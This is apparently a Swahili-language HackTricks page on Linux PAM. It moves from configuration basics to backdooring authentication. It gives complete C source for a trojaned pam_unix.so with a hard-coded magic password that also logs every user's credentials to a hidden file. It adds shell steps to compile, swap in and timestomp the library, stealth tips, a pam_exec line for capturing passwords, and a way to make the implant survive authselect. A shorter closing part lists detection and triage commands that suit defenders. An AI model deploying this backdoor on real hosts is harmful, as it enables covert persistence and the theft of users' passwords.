# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Taarifa za Msingi

**PAM (Pluggable Authentication Modules)** hufanya kazi kama mfumo wa usalama unaothibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni kama mlinzi wa kidijitali wa lango, anayehakikisha kuwa watumiaji walioidhinishwa pekee wanaweza kutumia huduma mahususi, huku ikiwezekana kupunguza matumizi yao ili kuzuia mifumo kuzidiwa.

#### Faili za Usanidi

- **Solaris na mifumo inayotumia UNIX** kwa kawaida hutumia faili kuu ya usanidi iliyo katika `/etc/pam.conf`.
- **Mifumo ya Linux** hupendelea mpangilio wa saraka, huku ikihifadhi usanidi mahususi wa huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya huduma ya login inapatikana katika `/etc/pam.d/login`.

Mfano wa usanidi wa PAM kwa huduma ya login unaweza kuonekana hivi:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Maeneo ya Usimamizi ya PAM**

Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, kila moja ikiwa na jukumu la kushughulikia vipengele tofauti vya mchakato wa uthibitishaji na usimamizi wa session:

- **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kuomba password.
- **Account**: Hushughulikia uthibitishaji wa account, kwa kuangalia masharti kama uanachama wa group au vizuizi vya muda wa siku.
- **Password**: Hushughulikia masasisho ya password, ikiwemo ukaguzi wa ugumu au uzuiaji wa dictionary attacks.
- **Session**: Hushughulikia vitendo wakati wa kuanza au kumaliza session ya service, kama vile ku-mount directories au kuweka resource limits.

#### **Vidhibiti vya Module za PAM**

Vidhibiti huamua mwitikio wa module inapofanikiwa au kushindwa, na hivyo kuathiri mchakato mzima wa uthibitishaji. Hivi ni pamoja na:

- **Required**: Kushindwa kwa module ya required husababisha kushindwa mwishoni, lakini tu baada ya module zote zinazofuata kukaguliwa.
- **Requisite**: Mchakato hukatizwa mara moja module inaposhindwa.
- **Sufficient**: Mafanikio huruka ukaguzi uliobaki wa realm hiyo hiyo isipokuwa module inayofuata ishindwe.
- **Optional**: Husababisha kushindwa tu ikiwa ndiyo module pekee kwenye stack.

#### Semantics za Offensive Muhimu

Wakati wa kufanya Backdooring PAM, **eneo la rule lililoingizwa** mara nyingi ni muhimu zaidi kuliko payload yenyewe:

- `include` na `substack` huvuta rules kutoka kwenye files nyingine, kwa hiyo kuhariri `sshd` kunaweza kuathiri SSH pekee, huku kuhariri `system-auth`, `common-auth`, au shared stack nyingine kukiathiri services kadhaa kwa wakati mmoja.
- PAM pia inasaidia controls zilizo kwenye mabano kama `[success=1 default=ignore]`. Hizi zinaweza kutumiwa vibaya **kuruka module moja au zaidi** baada ya custom check kufanikiwa, badala ya kubadilisha `pam_unix.so` kwa njia inayoonekana wazi.
- `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** kwa default PAM module directory. Kwenye Linux systems za kisasa, directories halisi mara nyingi huwa `/lib/security`, `/lib64/security`, `/usr/lib/security`, au multiarch paths kama `/usr/lib/x86_64-linux-gnu/security`.

Ushauri wa haraka kwa operator: kila mara tengeneza ramani ya **service graph nzima** kabla ya kufanya patch. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha implant hiyo hiyo ya mstari mmoja inaweza kuenea kwa kiwango kikubwa zaidi kuliko ilivyokusudiwa.

#### Mfano wa Scenario

Katika setup yenye auth modules nyingi, mchakato hufuata mpangilio madhubuti. Ikiwa module ya `pam_securetty` itapata kwamba login terminal haijaidhinishwa, root logins huzuiwa, lakini modules zote bado huchakatwa kutokana na status yake ya "required". `pam_env` huweka environment variables, jambo ambalo linaweza kusaidia user experience. Modules za `pam_ldap` na `pam_unix` hufanya kazi pamoja kuthibitisha user, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, na hivyo kuongeza ufanisi na unyumbufu katika methods za uthibitishaji.

## Backdooring PAM – Hooking `pam_unix.so`

Mbinu ya kawaida ya persistence katika Linux environments zenye thamani kubwa ni **kubadilisha PAM library halali na drop-in yenye trojan**. Kwa kuwa kila SSH / console login huishia kuita `pam_unix.so:pam_sm_authenticate()`, mistari michache ya C inatosha kukamata credentials au kutekeleza bypass ya password ya *magic*.

### Mwongozo Mfupi wa Compilation
<details>
<summary>Sample ya trojan ya `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile na ubadilishe kwa siri:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Vidokezo vya OpSec
1. **Atomic overwrite** – andika kwenye faili ya muda kisha `mv` ili kuiweka mahali pake, hivyo kuepuka libraries zilizoandikwa nusu ambazo zingefungia SSH.
2. Kuweka log file kama `/usr/bin/.dbus.log` huchanganyika na desktop artefacts halali.
3. Weka symbol exports zifanane (`pam_sm_setcred`, n.k.) ili kuepuka PAM kufanya kazi isivyotarajiwa.

### Utambuzi
* Linganisha MD5/SHA256 ya `pam_unix.so` na ile ya distro package.
* `rpm -V pam` au `debsums -s libpam-modules` ili kubaini libraries zilizobadilishwa bila manual hashing.
* Kagua ownership inayoweza kuandikwa na kila mtu au ownership isiyo ya kawaida chini ya `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Tumia Grep kwenye PAM configs kutafuta modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (baada ya compromise au threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Kutumia `pam_exec` kwa persistence
Badala ya kubadilisha `pam_unix.so`, njia isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili kila SSH login ianzishe implant huku stack ya kawaida ikiendelea kubaki:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Kwa `expose_authtok`, helper inaweza pia kusoma password kutoka `stdin` wakati wa awamu za `auth` au `password`. Ikiwa unataka helper iendeshe kwa effective UID badala ya real UID, ongeza `seteuid`.

Maelezo ya kiutendaji:

- `session optional pam_exec.so ...` ni bora kwa **post-login actions** kama vile kufungua tena sockets au kuanzisha daemon iliyojitenga.
- `auth optional pam_exec.so quiet expose_authtok ...` ndiyo chaguo la kawaida kwa **credential capture** kwa sababu inaendeshwa kabla session haijafunguka.
- `type=session` au `type=auth` inaweza kutumiwa kuzuia execution kwenye awamu mahususi ya PAM na kuepuka execution mbili zenye kelele.

### Kunusurika kwa distro tooling: `authselect`

Kwenye RHEL, CentOS Stream, Fedora, na derivative systems, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kuandikwa upya na `authselect`**. Kwa persistence, operators mara nyingi hubandika active custom profile iliyo chini ya `/etc/authselect/custom/<profile>/`, kisha hui-select tena au hui-apply.

Typical workflow ukiwa na root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Hili ni muhimu kwa **offense** na **triage**: ikiwa `/etc/pam.d/system-auth` ina banner `Generated by authselect` na `Do not modify this file manually`, basi sehemu halisi ya persistence inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.

### Tradecraft ya hivi karibuni iliyoonekana

Ripoti za hivi karibuni za 2025 kuhusu **Plague** Linux backdoor zilionyesha wazo hili hili likiendelezwa zaidi: component hasidi ya PAM yenye **static bypass password**, pamoja na kusafisha environment variables zinazohusiana na SSH na shell history (`HISTFILE=/dev/null`) ili kupunguza session traces baada ya login. Huu ni hunting pattern muhimu kwa sababu logic ya backdoor inaweza kuwa ndani ya PAM, huku stealth artifacts zikionekana tu **baada ya** authentication kufanikiwa.


## Marejeo

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
